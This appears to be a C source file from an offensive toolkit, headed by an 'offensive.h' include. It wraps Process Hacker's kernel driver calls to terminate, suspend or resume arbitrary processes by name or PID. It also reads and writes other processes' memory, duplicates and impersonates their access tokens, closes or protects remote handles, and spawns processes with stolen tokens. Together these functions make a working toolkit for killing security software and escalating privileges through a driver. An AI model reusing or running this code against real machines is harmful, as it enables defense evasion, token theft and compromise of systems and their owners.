#include "offensive.h"

/*
TO DO: 
* OphImpersonateToken(DWORD pid);
* OphSuspendProcess(DWORD pid);
* OphResumeProcess(DWORD pid);
* OphTerminateProcess(DWORD pid);
* OphReadVirtualMemory(DWORD pid, PVOID BaseAddress, SIZE_T nSize);
* OphWriteVirtualMemory(DWORD pid, PVOID BaseAddress, PVOID Buffer, SIZE_T nSize);
* OphQueryInformationProcess(DWORD pid, PVOID ProcessInformation);
	What information can be gathered?
* OphQueryProtectionProcess(DWORD pid);
* OphQueryProcessExecuteFlags(DWORD pid);
	https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/enable-system-critical-breaks
? OphUnprotectProcess(DWORD pid);
? OphTerminateThread(DWORD pid, DWORD tid);
* OphGetContextThread(DWORD pid, DWORD tid);
	what information can be gathered?
? OphCaptureStackThread(DWORD pid, DWORD tid);
* OphDuplicateObject();
* OphCloseRemoteHandle(HANDLE hProc, HANDLE hObj);
* OphQueryInformationObject(LPWSTR ObjectName, PVOID Buffer);
	There are lots of info can be gathered
* OphProtectObject(HANDLE hProc, HANDLE hObj);
*/
#include <Psapi.h>
#include<tlhelp32.h>
BOOL IsWow64_Native()
{
	SYSTEM_INFO si;
	typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
	LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle(L"kernel32"), "GetNativeSystemInfo");;
	fnGetNativeSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
	{
		return true;
	}
	return false;;
}
//#define _ENUMNPROCESS_
DWORD GetiPidByName(wchar_t *pName)
{

	DWORD dwRet = 0;
	wchar_t szDst[200] = { 0 };
	wcscpy_s(szDst,sizeof(szDst)/ sizeof(szDst[0]), pName);
	CharLowerW(szDst);
#ifndef _ENUMNPROCESS_
	// 定义进程信息结构
	PROCESSENTRY32 pe32 = { sizeof(pe32) };

	// 创建系统当前进程快照
	HANDLE hProcessShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessShot == INVALID_HANDLE_VALUE)
		return FALSE;

	// 输出进程信息到文件
	// 循环枚举进程信息
	TCHAR szBuf[80] = { 0 };
	if (Process32First(hProcessShot, &pe32))
	{
		do 
		{
			wchar_t szTemp[200] = { 0 };
			wcscpy_s(szTemp, sizeof(szTemp)/sizeof(szTemp[0]),pe32.szExeFile);
			::CharLowerW(szTemp);
			//wprintf(L"%s::%s\n", szDst, szTemp);
			if (wcscmp(szDst, szTemp) == 0)
			{
				dwRet = pe32.th32ProcessID;
				printf("find process,pid==%d\n", dwRet);
				break;
			}
			
		} while (Process32Next(hProcessShot, &pe32));
	}
	CloseHandle(hProcessShot);
#else //endif
	int is64System = ::IsWow64_Native();
	DWORD processPID[300] = { 0 }; //保存进程ID
	DWORD dwneed;
	::EnumProcesses(processPID, sizeof(processPID), &dwneed);
	int count = dwneed / sizeof(DWORD);
	//TRACE("总进程数为%dn", count);
	HANDLE hProcess = NULL;
	HMODULE hModule;
	DWORD need;
	DWORD nSize = 0;
	wchar_t fileName[300] = { 0 };
	for (int i = 0; i < count; i++)
	{
		memset(fileName, 0, sizeof(fileName));
		if (hProcess)
		{
			CloseHandle(hProcess);
			hProcess = NULL;
		}
		hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processPID[i]);
		if (!hProcess)
		{
			continue;
		}
		//	TRACE("ppp==%d\n", processPID[i]);
		BOOL bIs64Process = TRUE;
		IsWow64Process(hProcess, &bIs64Process);
		DWORD dwLen = sizeof(fileName);
		if (bIs64Process == FALSE && is64System)//== FALSE)
		{
			//枚举第一个模块句柄也就是自身 
			if (!QueryFullProcessImageNameW(hProcess, 0, fileName, &dwLen))
			{
				continue;
			}
			else
			{
				//TRACE("nnn==%d\n", processPID[i]);
			}

			::CharLowerW(fileName);
			wchar_t* pEnd = wcsrchr(fileName, '\\');
			if (!pEnd)
				continue;
			pEnd += 1;
			//wprintf(L"%s::%s\n", szDst, pEnd);
			if (wcscmp(szDst, pEnd) == 0)
			{
				dwRet = processPID[i];
				printf("find process,pid==%d\n", dwRet);
				break;
			}

		}
		else
		{
			BOOL bRet = ::EnumProcessModules(hProcess, &hModule, sizeof(hModule), &need);
			if (!bRet)
			{
				continue;
			}
			dwRet = ::GetModuleFileNameExW(hProcess, hModule, fileName, dwLen);
			if (dwRet <= 2)
			{
				continue;
			}
		}
		::CharLowerW(fileName);
		wchar_t * pEnd = wcsrchr(fileName, '\\');
		if (!pEnd)
			continue;
		pEnd += 1;
		//wprintf(L"%s::%s\n", szDst, pEnd);
		if (wcscmp(szDst, pEnd) == 0)
		{
			dwRet = processPID[i];
			printf("find process,pid==%d\n", dwRet);
			break;
		}
	}
	if (hProcess)
	{
		CloseHandle(hProcess);
		hProcess = NULL;
	}
#endif
	return dwRet;
}
DWORD OphTerminateProcessByName(wchar_t* pName)
{
	wprintf(L"\nkill by name==%s\n", pName);
	DWORD pid = GetiPidByName(pName);
	if (pid == 0)
		return STATUS_SUCCESS;
	return OphTerminateProcess(pid);
}

DWORD OphTerminateProcess(DWORD pid) {
	HANDLE hProc; 
	NTSTATUS status;
	NTSTATUS exitStatus = STATUS_SUCCESS;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	printf("\n[*] Trying to terminate pid: %d", pid);
	status = KphTerminateProcess(hProc, exitStatus);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphTerminateProcess: %X", status);
		goto Clean;
	}
	printf("\n[+] KphTerminateProcess is SUCCESSFUL");
	CloseHandle(hProc);
	return 0;

Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphSuspendProcess(DWORD pid) {
	HANDLE hProc; 
	NTSTATUS status;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		goto Clean;
	}
	status = KphSuspendProcess(hProc);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphSuspendProcess: %X", status);
		goto Clean;
	}
	CloseHandle(hProc);
	return 0;

Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphResumeProcess(DWORD pid) {
	HANDLE hProc; 
	NTSTATUS status;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphResumeProcess(hProc);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphResumeProcess: %X", status);
		goto Clean;
	}
	CloseHandle(hProc);
	return 0;

Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphReadVirtualMemory(DWORD pid, PVOID lpBaseAddress, SIZE_T nSize) {
	HANDLE hProc;
	NTSTATUS status;
	PVOID lpBuffer;
	SIZE_T rSize;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	lpBuffer = VirtualAlloc(nullptr, nSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	status = KphReadVirtualMemoryUnsafe(hProc, lpBaseAddress, lpBuffer, nSize, &rSize);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphReadVirtualMemoryUnsafe: %X", status);
		goto Clean;
	}
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphReadProcessPEB(DWORD pid) {
	HANDLE hProc;
	PROCESS_BASIC_INFORMATION pbi;
	PEB peb;
	NTSTATUS status;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	if (!NT_SUCCESS(status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), 0))) {
		printf("\n[-] Failed to NtQueryInformationProcess: %X", status);
		goto Clean;
	}
	status = KphReadVirtualMemoryUnsafe(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), 0);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphReadVirtualMemoryUnsafe: %X", status);
		goto Clean;
	}
	printf("\n[+] Process %d PEB is read: %llx", pid, &pbi);
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphWriteVirtualMemory(DWORD pid, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T nSize) {
	HANDLE hProc;
	NTSTATUS status;
	SIZE_T wSize;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphWriteVirtualMemory(hProc, lpBaseAddress, lpBuffer, nSize, &wSize);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphWriteVirtualMemory: %X", status);
		goto Clean;
	}
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphImpersonateToken(DWORD pid) {
	HANDLE hProc;
	NTSTATUS status;
	HANDLE hToken, hTokenImp;
	BOOL bRes;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphOpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcessToken: %X", status);
		goto Clean;
	}
	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenImp);
	if (hTokenImp == INVALID_HANDLE_VALUE) {
		printf("\n[-] Failed to DuplicateToken: %d", GetLastError());
		CloseHandle(hToken);
		goto Clean;
	}
	SetThreadToken(nullptr, hTokenImp);
	CloseHandle(hToken);
	CloseHandle(hProc);
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;

}

DWORD OphDuplicateProcessToken(DWORD pid, PHANDLE phToken) {
	HANDLE hProc;
	NTSTATUS status;
	HANDLE hToken, hPrimary;
	BOOL bRes;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphOpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcessToken: %X", status);
		goto Clean;
	}
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary)) {
		printf("\n[-] DuplicateTokenEx is failed: %d", GetLastError());
		goto Clean;
	}
	printf("\n[+] Process %d token is duplicated as Impersonation Token!", pid);
	*phToken = hPrimary;
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphDuplicateProcessTokenImp(DWORD pid, PHANDLE phToken) {
	HANDLE hProc;
	NTSTATUS status;
	HANDLE hToken, hPrimary;
	BOOL bRes;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphOpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcessToken: %X", status);
		goto Clean;
	}
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hPrimary)) {
		printf("\n[-] DuplicateTokenEx is failed: %d", GetLastError());
		goto Clean;
	}
	printf("\n[+] Process %d token is duplicated as Impersonation Token!", pid);
	*phToken = hPrimary;
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphModifyThreadToken(DWORD tid, HANDLE hToken) {
	HANDLE hThread;
	NTSTATUS status;
	if (!NT_SUCCESS(status = PhOpenThread(&hThread, tid))) {
		printf("\n[-] Failed to KphOpenThread: %X", status);
		goto Clean;
	}
	if (!NT_SUCCESS(status = KphSetInformationThread(GetCurrentThread(), KphThreadImpersonationToken, &hToken, sizeof(HANDLE)))) {
		printf("\n[-] Failed to KphSetInformationThread: %X", status);
		goto Clean;
	}
	printf("\n[+] Thread %d token is set!", tid);
	return 0;
Clean:
	if (hThread) CloseHandle(hThread);
	return -1;
}

DWORD OphQueryProtectionProcess(DWORD pid) {
	HANDLE hProc; 
	NTSTATUS status; 
	KPH_PROCESS_PROTECTION_INFORMATION pi;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphQueryInformationProcess(hProc, KphProcessProtectionInformation, &pi, sizeof(KPH_PROCESS_PROTECTION_INFORMATION), nullptr);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphQueryInformationProcess: %X", status);
		goto Clean;
	}
	if (pi.IsProtectedProcess == TRUE) {
		printf("\n[*] PID %d is a Protected Process", pid);
		return 0;
	} else {
		printf("\n[*] PID %d is not a Protected Process", pid);
		return 0;
	}
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphQueryExecuteFlagsProcess(DWORD pid) {
	HANDLE hProc; 
	NTSTATUS status; 
	ULONG flags;

	status = PhOpenProcess(&hProc, pid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenProcess: %X", status);
		return -1;
	}
	status = KphQueryInformationProcess(hProc, KphProcessExecuteFlags, &flags, sizeof(flags), nullptr);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphQueryInformationProcess: %X", status);
		goto Clean;
	}
	if (flags & FLG_ENABLE_SYSTEM_CRIT_BREAKS) {
		printf("\n[*] Critical Process flag is on");
	}
	CloseHandle(hProc);
	return 0;
Clean:
	CloseHandle(hProc);
	return -1;
}

DWORD OphGetContextThread(DWORD tid) {
	HANDLE hThread; 
	NTSTATUS status;
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	status = PhOpenThread(&hThread, tid);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphOpenThread: %X", status);
		return -1;
	}
	status = KphGetContextThread(hThread, &ctx);
	if (status != STATUS_SUCCESS) {
		printf("\n[-] Failed to KphGetContextThread: %X", status);
		goto Clean;
	}
	printf("\n[+] Thread Context Retrieved. RIP: %X", ctx.Rip);
	return 0;
Clean:
	CloseHandle(hThread);
	return -1;
}

DWORD OphDuplicateHandle(HANDLE hProc, HANDLE hObj, PHANDLE phLocalObj) {
	NTSTATUS status;
	if (!NT_SUCCESS(status = KphDuplicateObject(hProc, hObj, GetCurrentProcess(), 
		phLocalObj, DUPLICATE_SAME_ACCESS, 0, 0))) {
		printf("\n[-] Failed to KphDuplicateObject: %X", status);
		return -1;
	}
	return 0;
}

DWORD OphQueryInformationObject(HANDLE hProc, HANDLE hObj, LPVOID Buffer, SIZE_T nSize) {
	NTSTATUS status;
	ULONG uReturn;
	if (!NT_SUCCESS(status = KphQueryInformationObject(hProc, hObj,
		KphObjectBasicInformation, Buffer, nSize, &uReturn))) {
		printf("\n[-] Failed to KphQueryInformationObject: %X", status);
		return -1;
	}
	return 0;
}

DWORD OphCloseRemoteHandle(HANDLE hProc, HANDLE hObj) {
	HANDLE hTemp;
	NTSTATUS status;
	if (!NT_SUCCESS(status = KphDuplicateObject(hProc, hObj, GetCurrentProcess(),
		&hTemp, 0, FALSE, DUPLICATE_CLOSE_SOURCE))) {
		printf("\n[-] Failed to KphDuplicateObject: %X", status);
		return -1;
	}
	printf("\n[+] Remote Handle 0x%X from PID %d is closed!", hObj, GetProcessId(hProc));
	return 0;
}

DWORD OphProtectObject(HANDLE hProc, HANDLE hObj) {
	NTSTATUS status;
	OBJECT_HANDLE_FLAG_INFORMATION flag;
	flag.ProtectFromClose = TRUE;
	flag.Inherit = FALSE;
	if (!NT_SUCCESS(status = KphSetInformationObject(hProc, hObj, KphObjectHandleFlagInformation, &flag, sizeof(flag)))) {
		printf("\n[-] Failed to KphSetInformationObject: %X", status);
		return -1;
	}
	printf("\n[+] Handle 0x%X from PID %d is protected from closing!", hObj, hProc);
	return 0;
}


DWORD OphCreateProtectedProcess(PHANDLE phProc) {
	WCHAR name[] = L"C:\\windows\\system32\\services.exe";
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	BOOL success = CreateProcess(nullptr, name, nullptr, nullptr, FALSE,
		CREATE_SUSPENDED | CREATE_PROTECTED_PROCESS, nullptr, nullptr, &si, &pi);
	printf("\nLast Error: %d", GetLastError());
	*phProc = pi.hProcess;
	WaitForSingleObject(pi.hProcess, 5000);
	return 0;
}

DWORD OphCreateProtectedProcessWithToken(PPROCESS_INFORMATION ppi, HANDLE hToken) {
	WCHAR name[] = L"C:\\windows\\system32\\services.exe";
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	//BOOL success = CreateProcess(nullptr, name, nullptr, nullptr, FALSE,
	//	CREATE_SUSPENDED | CREATE_PROTECTED_PROCESS, nullptr, nullptr, &si, &pi);
	if (!CreateProcessWithTokenW(hToken, 0, NULL,
		name, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("\n[-] Failed to CreateProcessWithTokenW: %d", GetLastError());
		return -1;
	}
	*ppi = pi;
	WaitForSingleObject(pi.hProcess, 1000);
	return 0;
}
